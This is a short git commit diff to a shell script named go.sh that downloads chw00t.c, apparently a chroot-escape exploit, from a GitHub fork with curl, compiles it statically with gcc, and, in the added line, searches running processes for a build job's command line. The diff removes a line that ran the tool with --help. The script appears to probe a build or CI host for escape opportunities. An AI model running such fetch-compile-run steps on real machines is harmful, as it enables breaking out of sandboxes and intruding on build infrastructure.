d6df4f25efd71df19a1a06244c442171f03670ff
Edward Mead <emead@indeed.com>
2018-10-29 15:54:25 +0900

    removed help output from go.sh

--- go.sh
+++ go.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-curl -L -o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
+ps -faux | grep 'bash -c set -o pipefail; /home/build/'
+curl -L-o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
 ls -al 1>&2
 /usr/bin/gcc lol.c -o lol -static 1>&2
 ls -al 1>&2
-./lol --help 1>&2
